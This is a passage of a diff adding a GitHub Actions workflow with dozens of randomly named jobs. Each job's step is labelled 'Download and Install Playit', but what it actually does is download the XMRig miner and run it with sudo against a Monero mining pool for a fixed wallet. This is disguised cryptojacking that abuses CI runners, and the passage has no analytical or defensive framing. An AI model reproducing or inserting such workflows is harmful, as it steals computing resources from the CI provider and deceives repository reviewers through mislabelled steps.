+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  fvsjqmytlktjivxw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wyqrkxgklxokumebi:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lmmcnetfusxnatrl:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  uiiqnobplyowpkgyw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  buoiygsvifrkrovh:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ioznlzcghhfjtiruh:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  eojoxuhnqjwvlfvr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  hzjuatlhfbhalkhlc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  bnxtqhqjgytemzjl:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  vljvanigyfogixedy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  thyzylgpgpiktynf:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qssmfogfmgnkxzyou:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  mzdgrorgjudtwrzn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  twmnwwurazranmvja:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  yhzritnbwtyueans:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ncbiofjzskghlhdjr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  qeiojeqjnyknfvwm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ujxkfcjbywgpgatum:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  uebgwedpckzwlhoz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qkosqutsctqxdzdkr:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  ngrjtzxrtmwfkwui:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  simqymfaozmbshhtu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  nufbhapdcpulthrk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xsmuqxvpdysghlibn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  domldabcncpbjxnw:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  zzwxvitwxohhizhuk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  yrudmvhphhftrcgt:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  lxlvumqcxhmoklpzb:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  sjftmccggxvysnfs:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ageajgkgcyszfkkjn:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  xkyaclwwgxhjuvhj:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  sczuqyhmpoedprcfu:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  vwudnphhldwylbjq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  xidkgfrdvrlatsdkd:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  uackqibljoqvfswm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  wmbodmftojpncxkox:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  lbdsmjoyivjcyoay:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  ilcshscdgswwsogmm:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  sangfkqchbmdlutc:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  pwunlcxzzrtqpkhhq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  eesunmskobkcdlwl:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  qsqiztudbchewsxpz:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  orskitjphofnpljo:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  bcxycswxlekobmgaq:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+  hdidtriqvhletbxk:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check out the repository
+        uses: actions/checkout@v2
+
+      - name: Download and Install Playit
+        run: |
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-noble-x64.tar.gz 
+          tar xvf xmrig-6.24.0-noble-x64.tar.gz 
+          cd xmrig-6.24.0
+          sudo ./xmrig -o xmr-eu1.nanopool.org:14433 -u 45G3j6vqmzGMBDJLRJNppiVQ59ydnVoijgyj8YifFvChSFLQg5WoJpJV8L5R3vwN6wXoNnYhNYgYj4FFiVokFzjh4KTJkMe --tls --coin monero
+
+
+  jgjzenybmqbxgtfuv:
+    runs-on: ubuntu-latest
+    
+    steps:
